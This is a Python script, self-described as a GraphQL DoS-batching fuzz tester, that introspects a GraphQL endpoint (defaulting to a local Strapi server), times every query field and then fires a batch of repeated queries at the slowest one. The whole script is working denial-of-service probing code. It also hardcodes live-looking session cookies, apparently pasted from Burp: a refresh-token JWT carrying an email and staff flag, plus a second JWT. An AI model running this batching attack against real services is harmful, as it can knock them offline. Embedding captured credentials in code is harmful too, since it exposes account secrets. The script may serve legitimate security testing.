#!/usr/bin/env python3
import argparse
import json
import sys
import time

import requests
from tqdm import tqdm
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

cookie_header = (
    "refreshToken=eyJhbGciOiJSUzI1NiIsImtpZCI6IkJCQUNyQ0M3WWt3N3FaTzAwOTh5bi1WMVFIaGhGZEZGXzdxcXJ5OFdjMWMiLCJ0eXAiOiJKV1QifQ.eyJpYXQiOjE3NDgzNjMwODQsIm93bmVyIjoic2FsZW9yIiwiaXNzIjoiaHR0cDovL2xvY2FsaG9zdDo4MDAwL2dyYXBocWwvIiwiZXhwIjoxNzUwOTU1MDg0LCJ0b2tlbiI6IjUwUVpsWjA4cVFRNyIsImVtYWlsIjoiaGVsbG9Ad2ViLmRlIiwidHlwZSI6InJlZnJlc2giLCJ1c2VyX2lkIjoiVlhObGNqbzBOUT09IiwiaXNfc3RhZmYiOnRydWUsImNzcmZUb2tlbiI6IjNDNmpGeXg1QXNNbUoxT3FKSFlQalhDSldEWHlGNVdONXZDYmljMnk0czFpUHE0NTN4eDc0bERZcjlUb0NmVUQifQ.zonYFiGWOAEFJl8b6spfHBqTCc9s8GN67vX4JPJqka-lzsly7L1pk-YpC1QMSNho8O1AliXPFhkYvbkYIXWpB96HdpsAF4I1d25IqnyUCqKX5FL38ykak5qXIsaibJYsHwm23CM8A3XVeYl4mM_KAN2ic2FkBNcD9SzWJJkmISC-JdBEfMCvJiN-kIdUn0f3Of8l2AzPCtTJz4T_AvzzBECad8S6drjBdDPOi3vy6X9m2iIwihO8rb9-ld9-ifJhboLrYRhB16wnsH1_CW5B_0805ACUuZt-jgLy_WRvILhoJZV6gZjUi1OYwbBSYc7SZ0cu03aHDu2oHVx4cUzE5Q;"
    "jwtToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzQ4NDQ0MTAzLCJleHAiOjE3NTEwMzYxMDN9.r4x08cYLHHBX1njMXNsTHJFyaYTcrnDjgUrTOsBNzDM"
)

headers = {
    "Content-Type": "application/json",
    # match Burp's cookie line exactly:
    "Cookie": cookie_header,
    # You can still include an Authorization header if your Strapi is set up to accept it:
    # "Authorization": f"Bearer {your_jwt}"
}

def load_introspection_query(path: str) -> dict:
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(Fore.RED + f"Error loading introspection query: {e}")
        sys.exit(1)


def load_schema_file(path: str) -> dict:
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(Fore.RED + f"Error loading schema file: {e}")
        sys.exit(1)


def send_query(url: str, payload) -> tuple:
    try:
        start = time.time()
        resp = requests.post(url, json=payload, headers=headers)
        try:
            message = resp.json()
            print(resp.status_code, message['errors'][0]['message'])
        except Exception as e:
            print("No error occured in the response of the POST")
        return resp, time.time() - start
    except Exception as e:
        print(Fore.RED + f"[Exception] {e}")
        return None, -1


def extract_query_fields(schema: dict) -> list:
    """
    Returns a list of tuples (field_name, subfields).
    If the field returns an object/interface/union, subfields=['__typename'], else [].
    """
    fields = []
    types = schema.get("data", {}).get("__schema", {}).get("types", [])
    # build a map for type lookup
    type_map = {t.get("name"): t for t in types}

    query_type = next((t for t in types if t.get("name") == "Query"), None)
    if not query_type:
        return []

    for f in query_type.get("fields", []):
        field_name = f.get("name")
        type_info = f.get("type")
        # unwrap NON_NULL and LIST
        while type_info.get("ofType"):
            type_info = type_info["ofType"]
        kind = type_info.get("kind")
        # for OBJECT, INTERFACE, UNION use __typename
        if kind in ("OBJECT", "INTERFACE", "UNION"):
            subfields = ["__typename"]
        else:
            subfields = []
        fields.append((field_name, subfields))
    return fields


def measure_field_timings(url: str, fields: list) -> list:
    """
    Returns list of (field_name, subfields, elapsed_time).
    """
    timings = []
    for field, subfields in tqdm(fields, desc="Measuring fields"):
        selection = f"{{ {field} {{ {' '.join(subfields)} }} }}" if subfields else f"{{ {field} }}"
        payload = {"query": f"query {selection}"}
        resp, elapsed = send_query(url, payload)
        if resp and resp.ok:
            timings.append((field, subfields, elapsed))
        else:
            print(Fore.YELLOW + f"[Warning] {field} -> HTTP {resp.status_code if resp else 'Error'}")
    return sorted(timings, key=lambda x: x[2], reverse=True)


def send_batched_queries(url: str, field: str, batch_size: int, subfield: str = None) -> None:
    if subfield:
        query_string = f"query {{ {field} {{ {subfield} }} }}"
    else:
        query_string = f"query {{ {field} }}"
    batch = [{"query": query_string} for _ in range(batch_size)]
    resp, elapsed = send_query(url, batch)
    if resp and resp.ok:
        print(Fore.GREEN + f"[OK] Batch of {batch_size} completed in {elapsed:.2f}s")
    else:
        print(Fore.RED + f"[FAIL] HTTP {resp.status_code if resp else 'Error'} in {elapsed:.2f}s")
        if resp: print(resp.text)


def main():
    parser = argparse.ArgumentParser(description="GraphQL DoS-batching fuzz tester")
    parser.add_argument("--url", "-u", default="http://localhost:1337/graphql", help="GraphQL endpoint URL")
    parser.add_argument("--introspect", "-i", default="introspecQuery.json", help="Introspection query file")
    parser.add_argument("--schema", "-s", default=None, help="Schema file (skip introspection)")
    parser.add_argument("--batch", "-b", type=int, default=3, help="Batch size")
    args = parser.parse_args()

    if args.schema:
        schema = load_schema_file(args.schema)
    else:
        introspection_payload = load_introspection_query(args.introspect)
        resp, _ = send_query(args.url, introspection_payload)
        if not resp or not resp.ok:
            print(Fore.RED + f"Introspection failed (HTTP {resp.status_code if resp else 'Error'})")
            sys.exit(1)
        schema = resp.json()

    fields = extract_query_fields(schema)
    if not fields:
        print(Fore.RED + "No query fields found.")
        sys.exit(1)

    timings = measure_field_timings(args.url, fields)
    if not timings:
        print(Fore.RED + "No successful field timings.")
        sys.exit(1)

    slowest_field, subfields, slowest_time = timings[0]
    print(Fore.GREEN + f"Slowest field: {slowest_field} ({slowest_time:.2f}s)")
    subfield = subfields[0] if subfields else None
    send_batched_queries(args.url, slowest_field, args.batch, subfield)

if __name__ == "__main__":
    main()
